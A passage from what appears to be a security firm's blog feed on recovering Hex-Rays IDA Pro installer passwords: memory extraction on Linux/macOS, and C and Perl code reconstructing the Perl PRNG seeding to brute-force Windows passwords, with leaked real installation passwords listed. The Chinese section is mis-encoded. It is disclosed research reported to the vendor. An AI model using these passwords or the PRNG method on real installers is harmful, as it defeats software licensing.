        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¤§ç´„ä¸€å€‹æœˆçš„é‹ç®—ï¼Œæˆ‘å€‘çµ‚æ–¼æˆåŠŸåˆ©ç”¨ Perl äº‚æ•¸ç”¢ç”Ÿå‡º IDA Pro çš„å®‰è£å¯†ç¢¼ï¼Œè€Œæ­£ç¢ºçš„å­—å…ƒçµ„é †åºç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;ã€‚ä¾‹å¦‚ hacking team æ´©æ¼çš„ IDA Pro 6.8 å®‰è£å¯†ç¢¼æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt;ï¼Œå°±å¯ç”¨ä¸‹é¢ç¨‹å¼ç¢¼ç”¢ç”Ÿï¼š&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&quot;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€éé€™äº›è³‡è¨Šï¼Œæˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€å€‹ç”¨ä¾†æš´åŠ›åˆ—èˆ‰å®‰è£å¯†ç¢¼çš„å­—å…¸æª”ï¼Œç¸®çŸ­æš´åŠ›åˆ—èˆ‰çš„æ™‚é–“ï¼Œå¯¦ä½œæ–¹å¼å¯åƒè€ƒ &lt;a href=&quot;https://github.com/kholia/inno2john&quot;&gt;inno2john&lt;/a&gt; å°ˆæ¡ˆã€‚åœ¨ä¸€èˆ¬æƒ…æ³ä¸‹ï¼Œç´„ååˆ†é˜å³å¯ç®—å‡º windows å®‰è£æª”çš„å®‰è£å¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨å›å ± Hex-Rays å¾Œï¼Œä»–å€‘ç«‹åˆ»è¡¨ç¤ºä¹‹å¾Œå°‡æœƒä½¿ç”¨æ›´å®‰å…¨çš„å®‰è£å¯†ç¢¼ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç¸½çµ&quot;&gt;ç¸½çµ&lt;/h2&gt;

&lt;p&gt;æœ¬ç¯‡æ–‡ç« æå‡ºäº†ä¸€å€‹é–‹æ”¾æ€§å•é¡Œï¼šåœ¨æœªçŸ¥å®‰è£å¯†ç¢¼çš„æƒ…æ³ä¸‹å¯ä¸å¯ä»¥å®‰è£ IDA Proï¼Ÿçµæœæˆ‘å€‘åœ¨ Linux ä»¥åŠ MacOS ç‰ˆç™¼ç¾å¯ä»¥å¾è¨˜æ†¶é«”ä¸­å–å¾—æ˜æ–‡å¯†ç¢¼ã€‚è€Œåœ¨ Windows ç‰ˆæœ¬ä¸­ï¼Œæˆ‘å€‘é»‘ç®±æ‰¾åˆ°äº†å®‰è£å¯†ç¢¼ç”¢ç”Ÿçš„æ–¹å¼ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€ä»½å­—å…¸æª”ï¼Œç”¨ä»¥ç¸®çŸ­æš´åŠ›åˆ—èˆ‰å®‰è£å¯†ç¢¼çš„æ™‚é–“ï¼Œæœ€çµ‚ï¼Œæˆ‘å€‘ç´„ååˆ†é˜å¯è§£å‡ºä¸€çµ„å¯†ç¢¼ï¼Œæ˜¯ä¸€å€‹å¯ä»¥æ¥å—çš„æ™‚é–“ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘çœŸçš„å¾ˆå–œæ­¡é€™æ¨£çš„éç¨‹ï¼šæœ‰æ ¹æ“šçš„å¤§è†½çŒœæ¸¬ï¼Œç«­ç›¡å…¨åŠ›ç”¨ä»»ä½•å·²çŸ¥è³‡è¨Šå»è­‰æ˜æˆ‘å€‘çš„æƒ³æ³•ï¼Œä¸è«–çŒœæ¸¬æ˜¯å°æ˜¯éŒ¯ï¼Œéƒ½èƒ½å¾éç¨‹ä¸­ç²å¾—å¾ˆå¤šç¶“é©—ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘é€™æ¬¡é¡˜æ„èŠ±ä¸€å€‹æœˆæ™‚é–“å»é©—è­‰ä¸€å€‹æˆåŠŸæ©Ÿç‡ä¸æ˜¯å¾ˆé«˜çš„å‡è¨­ã€‚é™„å¸¶ä¸€æï¼Œé€™æ¨£çš„æ…‹åº¦ï¼Œä¹Ÿè¢«é‹ç”¨åœ¨æˆ‘å€‘&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;ç´…éšŠæ¼”ç·´&lt;/a&gt;ä¸Šï¼Œæƒ³è¦è©¦è©¦å— :p&lt;/p&gt;

&lt;p&gt;å¯«åœ¨æœ€å¾Œï¼Œè¦æ„Ÿè¬ Hex-Rays å¾ˆå‹å–„ä¸”å¿«é€Ÿçš„å›æ‡‰ã€‚å³ä½¿é€™å€‹å•é¡Œä¸åŒ…å«åœ¨ &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt; è£¡é¢ï¼Œä»ç„¶æ…·æ…¨çš„è´ˆé€ Linux å’Œ MAC ç‰ˆ IDA åŠå‡ç´šåŸæœ‰ Windows ç‰ˆè‡³ IDA Proã€‚å†æ¬¡æ„Ÿè¬ã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - å‘ Hex-Rays å›å ±å¼±é»&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays èªªæ˜ä¹‹å¾Œæœƒå¢åŠ å®‰è£å¯†ç¢¼çš„å¼·åº¦ï¼Œä¸¦å”åŠ©é€šå ± BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock é‡‹å‡ºäº† InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Today, we are going to talk about the installation password of Hex-Rays IDA Pro, which is the most famous decompiler. What is installation password? Generally, customers receive a custom installer and installation password after they purchase IDA Pro. The installation password is required during installation process. However, if someday we find a leaked IDA Pro installer, is it still possible to install without an installation password? This is an interesting topic.&lt;/p&gt;

&lt;p&gt;After brainstorming with our team members, we verified the answer: Yes! With a Linux or MacOS version installer, we can easily find the password directly. With a Windows version installer, we only need 10 minutes to calculate the password. The following is the detailed process:&lt;/p&gt;

&lt;h3 id=&quot;-linux-and-macos-version&quot;&gt;* Linux and MacOS version&lt;/h3&gt;

&lt;p&gt;The first challenge is Linux and MacOS version. The installer is built with an installer creation tool called InstallBuilder. We found the plaintext installation password directly in the program memory of the running IDA Pro installer. Mission complete!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This problem is fixed after we reported through Hex-Rays. &lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; released InstallBuilder 19.2.0 with the protection of installation password on 2019/02/11.&lt;/p&gt;

&lt;h3 id=&quot;-windows-version&quot;&gt;* Windows version&lt;/h3&gt;

&lt;p&gt;It gets harder on Windows version because the installer is built with &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt;, which store its password with &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt;. Therefore, we cannot get the password simply with static or dynamic analyzing the installer, and brute force is apparently not an effective way. But the situation is different if we can grasp the methodology of password generation, which lets us enumerate the password more effectively!&lt;/p&gt;

&lt;p&gt;Although we have realized we need to find how Hex-Rays generate password, it is still really difficult, as we do not know what language the random number generator is implemented with. There are at least &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 random number generators&lt;/a&gt; known. It is such a great variation.&lt;/p&gt;

&lt;p&gt;We first tried to find the charset used by random number generator. We collected all leaked installation passwords, such as hacking teamâ€™s password, which is leaked by WikiLeaks.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the collected passwords we can summarize the charset:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The missing of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; seems to make sense because they are confusing characters.
Next, we guess the possible charset ordering like these:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lastly, we picked some common languagesï¼ˆc/php/python/perlï¼‰to implement a random number generator and enumerate all the combinations. Then we examined whether the collected passwords appears in the combinations. For example, here is a generator written in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
